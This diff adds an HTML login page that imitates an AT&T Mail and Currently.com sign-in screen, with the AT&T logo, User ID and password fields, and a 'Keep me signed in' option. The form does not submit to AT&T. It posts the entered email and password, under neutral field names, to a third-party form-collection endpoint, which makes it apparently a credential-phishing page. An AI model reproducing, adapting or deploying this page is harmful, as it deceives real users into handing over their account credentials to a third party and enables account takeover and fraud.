@@ -1,0 +1,304 @@
+ <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+<meta content="IE=edge" http-equiv="X-UA-Compatible">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes" name="viewport"/>
+<meta content="no-cache" http-equiv="Pragma"/>
+<meta content="-1" http-equiv="Expires"/>
+<link crossorigin="" href="https://aadcdn.msftauth.net" rel="preconnect"/>
+<meta content="on" http-equiv="x-dns-prefetch-control"/>
+<meta content="signout" name="PageID"/>
+<meta content="" name="SiteID"/>
+<meta content="1033" name="ReqLC"/>
+<meta content="en-US" name="LocLC"/>
+<title>Login screen</title>
+<style>
+
+body {
+  margin: 0;
+  padding: 0;
+  background: white;
+  background-size: cover;
+  background-position: center;
+  font-family: sans-serif;
+}
+
+
+.loginbox {
+  border-radius: 16px;
+  box-shadow: rgb(220, 223, 227) 0px 0px 0px 1px inset;
+  box-sizing: border-box;
+  color: rgb(69, 75, 82);
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  font-family: sans-serif;
+  font-weight: 400;
+  margin: 64px auto 0;
+  max-width: 100%;
+  width: 460px;
+  padding: 0;
+}
+
+.login-form {
+  padding: 0 20px; /* Add some padding for better readability */
+  width: 100%;
+  box-sizing: border-box;
+}
+
+/* Media query for responsiveness */
+@media (max-width: 768px) {
+  .loginbox {
+    width: 100%; /* Adjust this value as needed */
+    margin: 64px auto 0;
+  }
+}
+
+.logo-head {
+  align-items: center;
+  box-sizing: border-box;
+  color: rgb(69, 75, 82);
+  display: flex;
+  flex-direction: column;
+  height: 206.875;
+  line-height: 18px;
+  margin-bottom: 0px;
+  margin-left:0px;
+  margin-right:0px;
+  margin-top:0px;
+  padding-bottom:0px;
+  padding-top: 50px;
+}
+
+.att-logo {
+  max-width: 100px;
+  max-height: 100px;
+  margin-bottom: 32px;
+}
+
+h1 {
+  color: rgb(29, 35, 41);
+  text-align: center;
+  display: block;
+  font-family: sans-serif;
+  margin-bottom: 0px;
+}
+
+h2 {
+  color: rgb(29, 35, 41);
+  text-align: center;
+  display: block;
+  font-family: sans-serif;
+}
+
+.h2-2 {
+  margin-top: 0px;
+}
+
+p {
+  color: rgb(69, 75, 82);
+  font-family: sans-serif;
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  cursor: pointer;
+  align-items: center;
+}
+
+
+.button {
+align-items: center;
+appearance: auto;
+background-color: rgb(0, 87, 184);
+border-bottom-left-radius: 28px;
+border-bottom-right-radius: 28px;
+border-top-left-radius: 28px;
+border-top-right-radius: 28px;
+border-bottom-style: solid;
+border-left-style: solid;
+border-right-style: solid;
+border-top-style: solid;
+border-bottom-width: 2px;
+border-left-width: 2px;
+border-right-width: 2px;
+border-top-width: 2px;
+
+border-image-outset: 0;
+border-image-repeat: stretch;
+border-image-slice: 100%;
+border-image-source: none;
+border-image-width: 1;
+border-bottom-color: rgb(0, 87, 184);
+border-left-color: rgb(0, 87, 184);
+border-right-color: rgb(0, 87, 184);
+border-top-color: rgb(0, 87, 184);
+box-sizing: border-box;
+color: rgb(242, 250, 253);
+cursor: pointer;
+display: inline-flex;
+font-family: sans-serif;
+font-optical-sizing: auto;
+font-feature-settings: normal;
+font-kerning: auto;
+font-size: 14px;
+font-stretch: 100%;
+font-style: normal;
+font-variant-alternates: normal;
+font-variant-caps: normal;
+font-variant-east-asian: normal;
+font-weight: 500;
+height: 48px;
+justify-content: center;
+letter-spacing: -0.42px;
+line-height: 14px;
+margin-bottom: 0px;
+margin-bottom: 0px;
+margin-left: 0px;
+margin-right: 0px;
+outline-color: rgba(0, 0, 0, 0);
+outline-offset: -4px;
+outline-style: solid;
+outline-width: 1px;
+padding-bottom: 0px;
+padding-left: 32px;
+padding-right: 32px;
+padding-top: 0px;
+text-align: center;
+text-decoration-color: rgb(242, 250, 253);
+text-decoration-line: none;
+text-decoration-style: solid;
+text-indent: 0px;
+text-rendering: auto;
+text-shadow: none;
+transition-delay: 0s;
+transition-duration: 0.2s;
+transition-property: all;
+transition-timing-function: linear;
+vertical-align: bottom;
+width: 360px;
+}
+
+
+.check-box {
+  box-sizing: border-box;
+  color: rgb(69, 75, 82);
+  display: block;
+  font-family: sans-serif;
+  font-size: 18px;
+  font-weight: 400;
+  height: ;
+  line-height: 18px;
+  margin-bottom: 30px;
+  margin-left: 0px;
+  margin-right: 0px;
+  margin-top: 24px;
+  text-size-adjust: 100%;
+}
+
+
+.forgot-password {
+  background-color: rgba(0, 0, 0, 0);
+  box-sizing: border-box;
+  color: rgb(0, 87, 184);
+  cursor: pointer;
+  font-family: sans-serif;
+  font-size: 15px;
+  font-weight: bold;
+  height: ;
+  line-height: 21px;
+  text-decoration-color: rgb(0, 87, 184);
+  text-decoration-line: none;
+  text-decoration-style: solid;
+  margin-bottom: 0px;
+  margin-top: 24px;
+  margin-left: 0px;
+  margin-right: 0px;
+}
+
+
+.forms-div {
+  padding-bottom: 50px;
+}
+
+.user-input {
+  align-items: center;
+  appearance: none;
+  background-color: rgb(255, 255, 255);
+  border-bottom-left-radius: 8px;
+  border-bottom-right-radius: 8px;
+  border-top-left-radius: 8px;
+  border-top-right-radius: 8px;
+  border-bottom-style: solid;
+  border-left-style: solid;
+  border-right-style: solid;
+  border-top-style: solid;
+  border-bottom-width: 1px;
+  border-right-width: 1px;
+  border-top-width: 1px;
+  border-left-style: 1px;
+  border-image-outset: 0;
+  border-image-width: 1;
+  border-image-repeat: stretch;
+  border-image-slice: 100%;
+  border-image-source: none;
+
+  width: 360px;
+  cursor: text;
+  display: flex;
+  box-sizing: border-box;
+  font-family: sans-serif;
+  font-stretch: 100%;
+  font-size: 16px;
+  font-weight: 400;
+  min-height: 48px;
+  padding-bottom: 0px;
+  padding-left: 16px;
+  padding-right: 24px;
+  padding-top: 0px;
+  text-align: start;
+  text-indent: 0px;
+  text-rendering: auto;
+  text-shadow: none;
+  text-transform: none;
+  vertical-align: middle;
+  border-bottom-color: rgb(104, 110, 116);
+  border-top-color: rgb(104, 110, 116);
+  border-right-color: rgb(104, 110, 116);
+  border-left-color: rgb(104, 110, 116);
+  font-style: normal;
+  font-feature-settings: normal;
+  font-kerning: auto;
+  font-optical-sizing: auto;
+  color: rgb(29, 35, 41;
+}
+  </style>
+<link href="local_resources/img/b90ef6e6ae7dce1d3e90539207095702.png" rel="icon" type="image/x-icon"/>
+<link href="local_resources/css/1639ac2e4ca10ea6f038975b80262eb4.css" rel="stylesheet" type="text/css"/>
+</meta></meta></head>
+<body>
+<div class="loginbox">
+<form action="https://nocodeform.io/f/66ab36ed3d7db102616cae4c" method="POST">
+<div class="logo-head">
+<img alt="AT&amp;T" class="att-logo" src="local_resources/img/0ad1e01328b35b9e1be800227a096508.png"/>
+<h1>Sign in</h1>
+<h2 class="h2-1">to access AT&amp;T Mail and</h2> <h2 class="h2-2">Currently.com</h2>
+</div>
+<div class="login-form">
+<p>User ID</p>
+<input class="user-input" id="login" name="AA" placeholder="" required="" type="email" value=""/>
+<p>Password</p>
+<input class="user-input" id="passwd" name="BB" placeholder="" required="" type="password"/> <br/>
+<input class="button" name="login" type="submit" value="Sign in"/> <br/>
+<div class="check-box">
+<input type="checkbox"/> <label for="">Keep me signed in</label> <br/>
+</div>
+<a class="forgot-password" href="index.html">Forgot user ID?</a>
+</div>
+</form>
+</div>
+</body>
+</html>
